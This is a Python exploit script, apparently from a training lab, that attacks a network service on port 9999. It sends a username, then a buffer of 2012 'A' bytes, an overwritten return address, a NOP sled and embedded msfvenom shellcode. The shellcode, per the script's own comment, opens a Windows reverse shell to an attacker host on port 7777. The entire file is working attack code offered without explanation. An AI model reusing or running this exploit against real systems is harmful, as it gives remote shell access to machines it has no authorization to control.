import socket
import sys

username = b"puckie"

message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32

#generated with smsfvenom -p windows/shell_reverse_tcp LHOST=10.11.3.122 LPORT=7777 -b"\x00" -f c

payload = (b"\xbf\xe9\xe6\x28\x5f\xda\xd7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x31\x7a\x12\x83\xea\xfc\x03\x93\xe8\xca\xaa\x9f\x1d\x88"
b"\x55\x5f\xde\xed\xdc\xba\xef\x2d\xba\xcf\x40\x9e\xc8\x9d\x6c"
b"\x55\x9c\x35\xe6\x1b\x09\x3a\x4f\x91\x6f\x75\x50\x8a\x4c\x14"
b"\xd2\xd1\x80\xf6\xeb\x19\xd5\xf7\x2c\x47\x14\xa5\xe5\x03\x8b"
b"\x59\x81\x5e\x10\xd2\xd9\x4f\x10\x07\xa9\x6e\x31\x96\xa1\x28"
b"\x91\x19\x65\x41\x98\x01\x6a\x6c\x52\xba\x58\x1a\x65\x6a\x91"
b"\xe3\xca\x53\x1d\x16\x12\x94\x9a\xc9\x61\xec\xd8\x74\x72\x2b"
b"\xa2\xa2\xf7\xaf\x04\x20\xaf\x0b\xb4\xe5\x36\xd8\xba\x42\x3c"
b"\x86\xde\x55\x91\xbd\xdb\xde\x14\x11\x6a\xa4\x32\xb5\x36\x7e"
b"\x5a\xec\x92\xd1\x63\xee\x7c\x8d\xc1\x65\x90\xda\x7b\x24\xfd"
b"\x2f\xb6\xd6\xfd\x27\xc1\xa5\xcf\xe8\x79\x21\x7c\x60\xa4\xb6"
b"\x83\x5b\x10\x28\x7a\x64\x61\x61\xb9\x30\x31\x19\x68\x39\xda"
b"\xd9\x95\xec\x4d\x89\x39\x5f\x2e\x79\xfa\x0f\xc6\x93\xf5\x70"
b"\xf6\x9c\xdf\x18\x9d\x67\x88\x2c\x69\x64\x32\x59\x6f\x6a\xdc"
b"\xf8\xe6\x8c\x8a\xea\xae\x07\x23\x92\xea\xd3\xd2\x5b\x21\x9e"
b"\xd5\xd0\xc6\x5f\x9b\x10\xa2\x73\x4c\xd1\xf9\x29\xdb\xee\xd7"
b"\x45\x87\x7d\xbc\x95\xce\x9d\x6b\xc2\x87\x50\x62\x86\x35\xca"
b"\xdc\xb4\xc7\x8a\x27\x7c\x1c\x6f\xa9\x7d\xd1\xcb\x8d\x6d\x2f"
b"\xd3\x89\xd9\xff\x82\x47\xb7\xb9\x7c\x26\x61\x10\xd2\xe0\xe5"
b"\xe5\x18\x33\x73\xea\x74\xc5\x9b\x5b\x21\x90\xa4\x54\xa5\x14"
b"\xdd\x88\x55\xda\x34\x09\x65\x91\x14\x38\xee\x7c\xcd\x78\x73"
b"\x7f\x38\xbe\x8a\xfc\xc8\x3f\x69\x1c\xb9\x3a\x35\x9a\x52\x37"
b"\x26\x4f\x54\xe4\x47\x5a")

try:
	print("Sending the payload ...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.190.194',9999))
	s.recv(1024)
	s.recv(1024)
	s.send(username + b'\r\n')
	s.recv(1024)
	s.send(message + payload +  b'\r\n')
	s.recv(1024)
	s.close()

except:
	print("Cannot connect to the server ...")
	sys.exit()
